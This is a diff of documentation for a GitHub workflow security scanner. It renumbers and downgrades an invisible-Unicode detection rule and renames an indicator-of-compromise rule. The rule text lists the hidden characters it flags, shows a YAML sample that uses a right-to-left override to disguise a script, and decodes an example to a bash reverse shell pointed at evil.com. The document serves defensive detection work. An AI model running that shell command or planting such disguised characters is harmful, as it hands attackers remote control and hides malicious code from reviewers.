@@ -4,38 +4,7 @@ Steganographic techniques can be used to hide malicious payloads or exfiltration
 
 ---
 
-## WRD-601: Unicode Steganography
-
-**Severity:** Critical
-
-**What it detects:** Invisible Unicode characters embedded in workflow YAML files. These can hide malicious commands, alter string comparisons, or use bidirectional text overrides to disguise code. Detected characters include:
-
-- U+200B (Zero Width Space)
-- U+200C/D (Zero Width Non-Joiner/Joiner)
-- U+200E/F (Left-to-Right / Right-to-Left Mark)
-- U+202A-202E (Bidi Embedding/Override characters)
-- U+2060-2064 (Invisible operators)
-- U+FEFF (BOM / Zero Width No-Break Space) -- except at file start
-- U+00AD (Soft Hyphen)
-- U+034F (Combining Grapheme Joiner)
-- U+061C (Arabic Letter Mark)
-- U+2066-2069 (Bidi Isolate characters)
-- U+FE00 (Variation Selector)
-- U+180E (Mongolian Vowel Separator)
-
-**Vulnerable:**
-
-```yaml
-# A step name containing RLO character to disguise what follows
-- name: Build‮hs.suoicilam
-  run: malicious.sh
-```
-
-**Remediation:** Enforce a CI check that rejects workflow files containing non-ASCII invisible characters. Use `warden scan` or a linter in a pre-commit hook. A BOM at position 0 is allowed.
-
----
-
-## WRD-602: Indicator of Compromise
+## WRD-602: Workflow Embedded IOC
 
 **Severity:** Critical
 
@@ -62,3 +31,34 @@ Steganographic techniques can be used to hide malicious payloads or exfiltration
 The decoded value is `bash -i >& /dev/tcp/evil.com/4444 0>&1` (a reverse shell).
 
 **Remediation:** Remove the suspicious pattern immediately. Audit any secrets or tokens that may have been exposed in previous runs. Never decode and execute base64 strings at runtime in workflows.
+
+---
+
+## WRD-621: Suspicious Invisible Unicode
+
+**Severity:** Medium
+
+**What it detects:** Invisible Unicode characters embedded in workflow YAML files. These can hide malicious commands, alter string comparisons, or use bidirectional text overrides to disguise code. Detected characters include:
+
+- U+200B (Zero Width Space)
+- U+200C/D (Zero Width Non-Joiner/Joiner)
+- U+200E/F (Left-to-Right / Right-to-Left Mark)
+- U+202A-202E (Bidi Embedding/Override characters)
+- U+2060-2064 (Invisible operators)
+- U+FEFF (BOM / Zero Width No-Break Space) -- except at file start
+- U+00AD (Soft Hyphen)
+- U+034F (Combining Grapheme Joiner)
+- U+061C (Arabic Letter Mark)
+- U+2066-2069 (Bidi Isolate characters)
+- U+FE00 (Variation Selector)
+- U+180E (Mongolian Vowel Separator)
+
+**Vulnerable:**
+
+```yaml
+# A step name containing RLO character to disguise what follows
+- name: Build‮hs.suoicilam
+  run: malicious.sh
+```
+
+**Remediation:** Enforce a CI check that rejects workflow files containing non-ASCII invisible characters. Use `warden scan` or a linter in a pre-commit hook. A BOM at position 0 is allowed.
